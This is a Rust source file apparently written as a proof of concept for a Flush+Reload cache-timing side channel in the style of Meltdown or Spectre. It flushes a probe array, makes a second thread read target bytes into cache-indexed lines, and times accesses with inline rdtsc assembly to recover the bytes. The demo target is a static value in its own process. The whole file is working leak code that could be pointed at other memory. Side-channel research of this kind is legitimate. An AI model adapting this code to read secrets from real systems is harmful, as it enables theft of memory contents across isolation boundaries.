#![feature(asm)]

use std::sync::atomic::{AtomicUsize, Ordering};
use std::thread;

const MULTIPLE_OFFSET: usize = 4096;
const CACHE_LINE_SIZE: usize = 64;
const NB_TRIES: usize = 1;

static TO_LEAK: usize = 0x0123456789abcdef;
static mut TEST_ARR: [u8; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE] =
    [127; 256 * MULTIPLE_OFFSET + CACHE_LINE_SIZE];
static mut HISTOGRAM: [[u64; NB_TRIES]; 256] = [[0; NB_TRIES]; 256];

static mut BASE_ADDR: usize = 0;

extern "C" fn handle_sigsegv(_: libc::c_int) {}

const STARTING: usize = 0;
const READY: usize = 1;
const ACCESSED: usize = 2;

static mut SYNC_POINT: AtomicUsize = AtomicUsize::new(STARTING);

#[inline]
unsafe fn measure_byte() -> u8 {
    // generally works better with NB_TRIES = 1, but quite simple to implement this support
    for j in 0..NB_TRIES {
        for i in 0..256 {
            let count_addr = BASE_ADDR as usize + i * MULTIPLE_OFFSET;
            let delta_tsc;
            // measure the time
            asm!("mfence", "lfence", "rdtsc", "lfence", "shl rdx, $32", "or rax, rdx", "mov rcx, rax",
                 "movzx r9, byte ptr [{0}]",
                 "mfence", "lfence", "rdtsc", "shl rdx, $32", "or rax, rdx", "sub rax, rcx",
                 in(reg) count_addr,
                 out("rdx") _, out("rcx") _, out("rax") delta_tsc, out("r9") _);
            HISTOGRAM[i][j] = delta_tsc;
        }
    }

    for i in 0..256 {
        HISTOGRAM[i].sort();
    }

    let medians = HISTOGRAM
        .iter()
        .map(|x| x[NB_TRIES / 2])
        .collect::<Vec<u64>>();
    //println!("{:?}", HISTOGRAM);
    //println!("{:?}", medians);

    let (idx, _) = medians
        .iter()
        .enumerate()
        .min_by(|(_, x), (_, y)| x.cmp(y))
        .unwrap();

    idx as u8
}

unsafe fn thread_leak_data(nb_bytes: usize) -> Vec<u8> {
    let mut res = Vec::with_capacity(nb_bytes);

    for _ in 0..nb_bytes {
        while SYNC_POINT.load(Ordering::Acquire) != STARTING {}

        // prefetch an entry for ensuring TLB won't impact the measures
        std::ptr::read_volatile(BASE_ADDR as *const u8);

        // flush
        for i in 0..((256 * MULTIPLE_OFFSET) / CACHE_LINE_SIZE) {
            core::arch::x86_64::_mm_clflush(
                (BASE_ADDR as usize + i * CACHE_LINE_SIZE) as *const u8 as *mut u8,
            );
        }

        SYNC_POINT.store(READY, Ordering::Release);

        while SYNC_POINT.load(Ordering::Acquire) != ACCESSED {}

        res.push(measure_byte());

        SYNC_POINT.store(STARTING, Ordering::Release);
    }

    res
}

unsafe fn thread_perform_access(target_adress: *const u8, nb_bytes: usize) {
    for i in 0..nb_bytes {
        while SYNC_POINT.load(Ordering::Acquire) != READY {}

        let target_adress = target_adress as usize + i;

        asm!("movzx rax, byte ptr [{0}]", "imul rax, {2}", "add {1}, rax", "movzx rax, byte ptr [{1}]", in(reg) target_adress, inout(reg) BASE_ADDR => _, in(reg) MULTIPLE_OFFSET, out("rax") _);

        SYNC_POINT.store(ACCESSED, Ordering::Release);
    }
}

fn measure_bytes_with_threads(target_adress: usize, nb_bytes: usize) -> Vec<u8> {
    let leaker = thread::spawn(move || unsafe { thread_leak_data(nb_bytes) });

    thread::spawn(move || unsafe { thread_perform_access(target_adress as *const u8, nb_bytes) })
        .join()
        .unwrap();

    leaker.join().unwrap()
}

fn read_ptr(target_adress: usize) -> usize {
    let vec = measure_bytes_with_threads(target_adress, 8);
    vec.iter()
        .enumerate()
        .fold(0, |acc, (pos, e)| acc | ((*e as usize) << (pos * 8)))
}

fn main() {
    // setup
    unsafe {
        let base_addr = TEST_ARR.as_ptr() as usize;
        // align on a cache line size
        BASE_ADDR = (base_addr + CACHE_LINE_SIZE) & (0xffffffffffffffff - CACHE_LINE_SIZE + 1);
    }

    println!("0x{:x}", read_ptr(&TO_LEAK as *const usize as usize));
}
